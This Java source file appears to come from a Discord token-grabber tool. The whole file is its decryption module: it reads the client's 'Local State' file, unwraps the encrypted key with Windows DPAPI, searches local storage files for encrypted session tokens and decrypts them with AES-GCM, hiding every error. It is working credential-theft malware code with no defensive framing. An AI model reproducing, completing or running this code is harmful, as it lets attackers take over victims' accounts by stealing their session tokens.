package main.java.clienttokengrabber.utils;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;

public class Decryptor {
    private static final Pattern TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    private static final int TOKEN_PREFIX_OFFSET = 12;
    private static final int DPAPI_OFFSET = 5;
    private static final int IV_OFFSET = 3;
    private static final int IV_SIZE = 12;
    private static final int PAYLOAD_OFFSET = 15;
    private static final int GCM_BIT_LENGTH = 128;

    public static Set<String> decryptTokens(String path, byte[] AESKey) {
        Set<String> decryptedTokens = new HashSet<>();

        for (byte[] decodedToken : listTokens(path)) {
            byte[] decryptedToken = new byte[IV_SIZE];
            System.arraycopy(decodedToken, IV_OFFSET, decryptedToken, 0, IV_SIZE);
            byte[] encryptedData = new byte[decodedToken.length - PAYLOAD_OFFSET];
            System.arraycopy(decodedToken, PAYLOAD_OFFSET, encryptedData, 0, encryptedData.length);

            try {
                Cipher GCM = Cipher.getInstance("AES/GCM/NoPadding");

                GCM.init(
                        Cipher.DECRYPT_MODE,
                        new SecretKeySpec(AESKey, "AES"),
                        new GCMParameterSpec(GCM_BIT_LENGTH, decryptedToken)
                );

                decryptedTokens.add(new String(GCM.doFinal(encryptedData)));
            } catch (Exception ignored) {
            }
        }

        return decryptedTokens;
    }

    public static byte[] getAESKey(String path) {
        try {
            Json localState = new Json(Paths.get(path, "Local State"));

            String encodedAESKey = localState.valueOf("encrypted_key");
            byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
            byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, DPAPI_OFFSET, decodedAESKey.length);

            return Crypt32Util.cryptUnprotectData(encryptedAESKey);
        } catch (Exception ignored) {
        }

        return null;
    }

    private static List<byte[]> listTokens(String path) {
        List<byte[]> newTokens = new ArrayList<>();

        FileManager.listValidFiles(path).forEach(file ->
            newTokens.addAll(decodeTokens(file))
        );

        return newTokens;
    }

    private static List<byte[]> decodeTokens(File file) {
        List<byte[]> decodedTokens = new ArrayList<>();

        try (Scanner tokenScanner = new Scanner(new FileInputStream(file), StandardCharsets.UTF_8)) {
            tokenScanner.forEachRemaining(line -> {
                Matcher tokenMatcher = TOKEN_REGEX.matcher(line);
                if (tokenMatcher.find()) {
                    String encodedToken = tokenMatcher.group().substring(TOKEN_PREFIX_OFFSET);
                    byte[] decodedToken = Base64.getDecoder().decode(encodedToken);
                    decodedTokens.add(decodedToken);
                }
            });
        } catch (Exception ignored) {
        }

        return decodedTokens;
    }
}
